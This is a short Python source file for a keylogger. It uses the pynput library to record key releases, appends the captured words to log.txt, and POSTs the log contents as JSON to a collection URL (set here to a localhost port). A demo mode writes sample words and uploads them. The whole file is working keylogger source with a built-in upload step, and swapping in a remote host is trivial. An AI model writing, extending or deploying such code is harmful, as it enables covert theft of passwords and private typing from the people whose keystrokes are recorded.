import os
from typing import List

import requests

try:
    from pynput.keyboard import Key, Listener
except Exception:
    Key = None
    Listener = None

char_count = 0
saved_keys: List[str] = []
LOG_FILE = 'log.txt'
API_URL = 'http://127.0.0.1:9002/collect'


def on_key_press(key):
    try:
        print('Key Pressed:', key)
    except Exception as ex:
        print('Error:', ex)


def on_key_release(key):
    global saved_keys, char_count
    if Key is None:
        return False
    if key == Key.esc:
        return False
    if key == Key.enter:
        write_to_file(saved_keys)
        char_count = 0
        saved_keys = []
    elif key == Key.space:
        key = ' '
        write_to_file(saved_keys)
        saved_keys = []
        char_count = 0

    saved_keys.append(key)
    char_count += 1


def write_to_file(keys: List[str]):
    with open(LOG_FILE, 'a', encoding='utf-8') as f:
        for key in keys:
            key = str(key).replace("'", '')
            if 'KEY' not in key.upper():
                f.write(key)
        f.write('\n')


def send_log_to_server():
    if not os.path.exists(LOG_FILE):
        print('No log file yet')
        return
    with open(LOG_FILE, 'r', encoding='utf-8') as f:
        content = f.read().strip()
    if not content:
        print('Log file is empty')
        return
    resp = requests.post(API_URL, json={'content': content}, timeout=10)
    print('Upload status:', resp.status_code, resp.text)


def run_demo_mode():
    # Safe demo for headless environment: simulate captured words.
    with open(LOG_FILE, 'w', encoding='utf-8') as f:
        f.write('testing\nmy\nname\nis\nbublik\n')
    send_log_to_server()


if __name__ == '__main__':
    timeout = int(os.getenv('KEYLOGGER_TIMEOUT', '10'))
    demo_mode = os.getenv('DEMO_MODE', '0') == '1'

    if demo_mode:
        print('Running DEMO_MODE')
        run_demo_mode()
    else:
        if Listener is None:
            print('pynput backend unavailable; using demo mode fallback')
            run_demo_mode()
        else:
            print('Start key logging...')
            with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
                listener.join(timeout=timeout)
            print('End key logging...')
            send_log_to_server()
